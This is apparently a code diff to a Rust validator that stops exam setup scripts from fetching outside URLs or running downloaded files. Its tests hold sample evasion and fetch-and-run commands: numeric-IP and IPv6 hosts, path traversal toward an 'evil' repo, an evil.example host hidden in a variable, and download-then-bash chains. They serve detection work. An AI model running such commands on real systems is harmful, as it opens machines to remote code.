@@ -42,12 +42,28 @@ fn scripts(q: &Question) -> Vec<(String, &str)> {
 }
 
 /// A URL's host is inside the cluster or the task host: a Service, a Pod,
-/// the loopback, a private address
-fn internal(host: &str) -> bool {
+/// the loopback, a private address. `script` says where a variable comes
+/// from: one read from the cluster (`VAR=$(kubectl ...)`) is the cluster's
+fn internal(host: &str, script: &str) -> bool {
     // `user@host`: the host is after the `@`
     let host = host.rsplit('@').next().unwrap_or(host);
+    // An IPv6 address: the loopback only
+    if host.starts_with('[') {
+        return host.starts_with("[::1]");
+    }
     let host = host.split(':').next().unwrap_or(host);
-    !host.contains('.')
+    // A built-in the app fills in: a node of the cluster (`{{control_plane}}`)
+    if host.starts_with("{{") {
+        return true;
+    }
+    if let Some(var) = host.strip_prefix('$') {
+        let var = var.trim_start_matches('{').trim_end_matches('}');
+        return [format!("{var}=$(kubectl "), format!("{var}=\"$(kubectl ")].iter().any(|a| script.contains(a.as_str()));
+    }
+    // Without a dot, a name is a Service or a host of the exam's network; a
+    // number is an address written as one (134744072 is 8.8.8.8)
+    let name = host.starts_with(|c: char| c.is_ascii_alphabetic()) && host.chars().all(|c| c.is_ascii_alphanumeric() || c == '-');
+    (!host.contains('.') && name)
         || host.ends_with(".svc")
         || host.contains(".svc.")
         || host.ends_with(".cluster.local")
@@ -56,6 +72,24 @@ fn internal(host: &str) -> bool {
         || host.starts_with("10.")
         || host.starts_with("192.168.")
         || (host.starts_with("172.") && host.split('.').nth(1).and_then(|o| o.parse::<u8>().ok()).is_some_and(|o| (16..32).contains(&o)))
+}
+
+/// Whether `url` leaves the path it starts with (`..`, an encoded dot or
+/// slash): a source's prefix says nothing then
+fn escapes(url: &str) -> bool {
+    let lower = url.to_ascii_lowercase();
+    lower.contains("/../") || lower.ends_with("/..") || lower.contains("%2e") || lower.contains("%2f")
+}
+
+/// The files a script downloads: what follows `-o`, `-O` or `--output`, and
+/// each URL's last segment (`curl -O`, `wget` with no name)
+fn downloads(script: &str) -> Vec<&str> {
+    let words: Vec<&str> = script.split_whitespace().collect();
+    // `-o` alone or last of short flags run together (`-sLo file`)
+    let names_a_file = |w: &str| w == "--output" || (w.starts_with('-') && !w.starts_with("--") && w.ends_with(['o', 'O']));
+    let named = words.windows(2).filter(|w| names_a_file(w[0])).map(|w| w[1].trim_matches(['"', '\'']));
+    let urls = urls(script).filter_map(|u| u.split(['?', '#']).next()?.rsplit('/').next());
+    named.chain(urls).filter(|n| !n.is_empty() && *n != "-" && !n.starts_with("http")).collect()
 }
 
 /// The URLs in a script
@@ -76,7 +110,7 @@ pub fn problems(q: &Question) -> Vec<String> {
     for (name, script) in scripts(q) {
         for url in urls(script) {
             let host = url.split("://").nth(1).and_then(|r| r.split('/').next()).unwrap_or("");
-            if !internal(host) && !SOURCES.iter().any(|s| url.starts_with(s)) {
+            if !internal(host, script) && (escapes(url) || !SOURCES.iter().any(|s| url.starts_with(s))) {
                 problems.push(format!("{name} fetches {url}: scripts fetch only from {} (or inside the cluster)", sources()));
             }
         }
@@ -93,7 +127,16 @@ pub fn problems(q: &Question) -> Vec<String> {
                 })
             })
         });
-        if fetch_run || flat.contains("<(curl") || flat.contains("<(wget") {
+        // Nor saved and run after: as a script, a program, sourced
+        let runs = |file: &str| {
+            let base = file.rsplit('/').next().unwrap_or(file);
+            ["sh ", "bash ", "zsh ", "dash ", "python ", "python3 ", "perl ", "source ", ". ", "exec ", "chmod +x "]
+                .iter()
+                .any(|run| flat.contains(&format!("{run}{file}")) || flat.contains(&format!("{run}./{base}")))
+                || flat.contains(&format!("./{base} ")) || flat.ends_with(&format!("./{base}"))
+        };
+        let saved_run = ["curl", "wget"].iter().any(|f| flat.contains(f)) && downloads(&flat).iter().any(|d| runs(d));
+        if fetch_run || saved_run || flat.contains("<(curl") || flat.contains("<(wget") {
             problems.push(format!("{name} runs what it downloads: write the commands out instead"));
         }
     }
@@ -124,6 +167,41 @@ mod tests {
         assert!(!problems(&sneaky).is_empty(), "a user part is not the host");
         let bad = question("kubectl apply -f https://example.com/x.yaml", "echo ok");
         assert!(problems(&bad)[0].contains("setup fetches https://example.com/x.yaml"), "{:?}", problems(&bad));
+    }
+
+    /// Addresses written as numbers, IPv6, a path that climbs out of a
+    /// source, a host in a variable set by hand: not the cluster's, nor a
+    /// source
+    #[test]
+    fn a_url_cannot_dress_up_as_the_cluster_or_a_source() {
+        for setup in [
+            "curl -s http://134744072/x",
+            "curl -s http://0x08080808/x",
+            "curl -s http://[2001:db8::1]/x",
+            "curl -sL https://github.com/kubernetes/../evil/x/raw/main/a.yaml",
+            "curl -sL https://github.com/kubernetes/%2e%2e/evil/a.yaml",
+            "H=evil.example; curl -s http://$H/x",
+        ] {
+            assert!(!problems(&question(setup, "kubectl get ns")).is_empty(), "{setup}");
+        }
+        for setup in ["curl -s http://web-svc/", "curl -s http://[::1]:8080/", "IP=$(kubectl get svc k -o jsonpath='{.spec.clusterIP}'); curl -sk https://$IP:443/"] {
+            assert!(problems(&question(setup, "kubectl get ns")).is_empty(), "{setup}");
+        }
+    }
+
+    #[test]
+    fn what_is_saved_then_run_is_refused() {
+        for setup in [
+            "curl -sLo /tmp/i.sh https://github.com/kubernetes/x/raw/main/i.sh; bash /tmp/i.sh",
+            "curl -sLO https://dl.k8s.io/release/v1.35.0/bin/linux/amd64/kubectl && chmod +x kubectl",
+            "wget -q https://github.com/kubernetes/x/raw/main/run.sh && sh run.sh",
+            "curl -sL https://github.com/kubernetes/x/raw/main/s -o s; ./s",
+        ] {
+            assert!(problems(&question(setup, "kubectl get ns")).iter().any(|p| p.contains("runs what it downloads")), "{setup}");
+        }
+        // Saved and only read: fine
+        let applied = "curl -sLo /tmp/m.yaml https://raw.githubusercontent.com/kubernetes/x/main/m.yaml; kubectl apply -f /tmp/m.yaml";
+        assert!(problems(&question(applied, "kubectl get ns")).is_empty());
     }
 
     #[test]
